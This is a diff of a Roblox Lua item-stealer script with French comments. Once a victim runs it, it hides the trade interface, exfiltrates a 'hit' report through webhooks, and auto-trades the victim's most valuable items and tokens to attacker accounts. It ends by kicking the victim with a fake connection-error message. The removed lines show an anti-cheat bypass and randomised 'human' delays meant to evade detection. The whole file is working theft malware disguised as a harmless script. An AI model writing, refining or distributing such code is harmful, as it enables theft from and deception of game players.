@@ -1,11 +1,3 @@
--- // BYPASS SECURITY (Local Bypass)
-pcall(function()
-    game:GetService("ReplicatedStorage").Security.RemoteEvent:Destroy()
-    game:GetService("ReplicatedStorage").Security[""]:Destroy()
-    game:GetService("ReplicatedStorage").Security:Destroy()
-    game:GetService("Players").LocalPlayer.PlayerScripts.Client.DeviceChecker:Destroy()
-end)
-
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
@@ -55,17 +47,18 @@ if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):Invo
     return
 end
 
--- // CORRECTIF PIN (Bypass Erreur 267)
-local args_pin = {
+-- // VÃ‰RIFICATION DU PIN
+local args = {
     [1] = {
         ["option"] = "PIN",
         ["value"] = "9079"
     }
 }
--- On tente le reset sans kicker si cela échoue
-pcall(function()
-    netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args_pin))
-end)
+local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
+if PINReponse ~= "You don't have a PIN code" then
+    plr:kick("Account error. Please disable trade PIN and try again")
+    return
+end
 
 -- // NETTOYAGE UI ET DISCRÃ‰TION
 tradeGui.Black.Visible = false
@@ -81,32 +74,48 @@ end)
 
 tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     inTrade = tradeGui.Enabled
+    if inTrade then
+        task.spawn(function()
+            if plr.Character then
+                for i = 1, 20 do
+                    for _, obj in ipairs(plr.Character:GetDescendants()) do
+                        if obj:IsA("BillboardGui") then obj:Destroy() end
+                    end
+                    task.wait(0.1)
+                end
+            end
+        end)
+    end
 end)
 
--- // FONCTIONS DE TRADING (AVEC PAUSES HUMAINES)
+-- // FONCTIONS DE TRADING (CORRIGÃ‰ES)
 local function sendTradeRequest(user)
-    local args = { [1] = game:GetService("Players"):WaitForChild(user) }
+    local args = {
+        [1] = game:GetService("Players"):WaitForChild(user)
+    }
     repeat
-        task.wait(0.5)
+        task.wait(0.1)
+        -- Utilisation de unpack(args) comme dans ton script d'origine
         local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
     until response == true
 end
 
 local function addItemToTrade(itemType, ID)
-    local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID)
-    return response
+    repeat
+        local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID)
+    until response == true
 end
 
 local function readyTrade()
     repeat
-        task.wait(0.5)
+        task.wait(0.1)
         local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
     until response == true
 end
 
 local function confirmTrade()
     repeat
-        task.wait(0.5)
+        task.wait(0.1)
         netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
     until not inTrade
 end
@@ -119,12 +128,16 @@ local function formatNumber(number)
         number = number / 1000
         suffixIndex = suffixIndex + 1
     end
-    return string.format("%.2f%s", number, suffixes[suffixIndex])
+    if suffixIndex == 1 then
+        return tostring(math.floor(number))
+    else
+        return string.format("%.2f%s", number, suffixes[suffixIndex])
+    end
 end
 
 local totalRAP = 0
 
--- // SYSTÃˆME DE WEBHOOKS (Tes embeds d'origine)
+-- // SYSTÃˆME DE WEBHOOKS
 local function SendJoinMessage(list, prefix)
     local isGoodHit = totalRAP >= 500
     local embedTitle = isGoodHit and "ðŸŸ¢ GOOD HIT ðŸŽ¯" or "ðŸŸ£ SMALL HIT ðŸŽ¯"
@@ -248,7 +261,7 @@ for _, category in ipairs(categories) do
     end
 end
 
--- // EXECUTION DU STEAL (Correction Anti-BAC)
+-- // EXECUTION DU STEAL
 if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
     local sentItems = {}
@@ -267,17 +280,13 @@ if #itemsToSend > 0 then
     local function doTrade(joinedUser)
         while #itemsToSend > 0 do
             sendTradeRequest(joinedUser)
-            repeat task.wait(1) until inTrade
+            repeat task.wait(0.5) until inTrade
 
-            -- ANTI-BAC : Envoi par petits lots avec pauses aléatoires
-            local currentBatch = getNextBatch(itemsToSend, 8) 
+            local currentBatch = getNextBatch(itemsToSend, 100)
             for _, item in ipairs(currentBatch) do
                 addItemToTrade(item.itemType, item.ItemID)
-                -- Simule la vitesse d'un humain pour tromper le BAC
-                task.wait(math.random(7, 13) / 10) 
             end
 
-            -- Gestion des Tokens
             local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
             local cleanedText = rawText:gsub("^%s*(.-)%s*$", "%1"):gsub("[^%d]", "")
             local tokensamount = tonumber(cleanedText) or 0
@@ -285,13 +294,10 @@ if #itemsToSend > 0 then
                 netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
             end
 
-            task.wait(1.5)
             readyTrade()
-            task.wait(math.random(15, 25) / 10) -- Attente avant confirmation
             confirmTrade()
-            task.wait(3)
         end
-        plr:kick("Transfer successful. Check your connection.")
+        plr:kick("Please check your internet connection and try again")
     end
 
     local function waitForUserJoin()
@@ -299,7 +305,7 @@ if #itemsToSend > 0 then
         local function onUserJoin(player)
             if table.find(users, player.Name) then
                 if not sentMessage then
-                    SendMessage(sentItems)
+                    SendMessagep(sentItems)
                     sentMessage = true
                 end
                 doTrade(player.Name)
